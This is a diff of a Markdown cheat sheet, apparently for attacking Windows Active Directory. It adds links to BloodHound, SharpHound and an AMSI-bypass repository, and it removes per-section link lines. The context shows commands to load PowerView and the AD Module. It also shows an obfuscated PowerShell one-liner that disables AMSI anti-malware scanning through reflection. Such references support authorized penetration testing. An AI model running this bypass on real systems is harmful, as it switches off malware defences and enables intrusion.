@@ -51,33 +51,33 @@ Last update: **07 Oct 2022**
 - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 - [PowerView Dev](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 - [AD Module](https://github.com/samratashok/ADModule)
+- [PowerShell AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+- [Neo4j - Community Version](https://neo4j.com/download-center/#community)
+- [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
+- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
 
 ## Pre-requisites
 ### Using PowerView:
 ```powershell
 . .\PowerView.ps1
 ```
-Link: [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
 ### Using PowerView dev:
 ```powershell
 . .\PowerView_dev.ps1
 ```
-Link: [PowerView Dev](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 
 ### Using AD Module
 ```powershell
 Import-Module .\Microsoft.ActiveDirectory.Management.dll
 Import-Module .\ActiveDirectory\ActiveDirectory.psd1
 ```
-Link: [AD Module](https://github.com/samratashok/ADModule)
 
 # PowerShell AMSI Bypass
 ```powershell
 # AMSI bypass
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
-Link: [PowerShell AMSI Bypass](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
 
 # Windows Defender
 
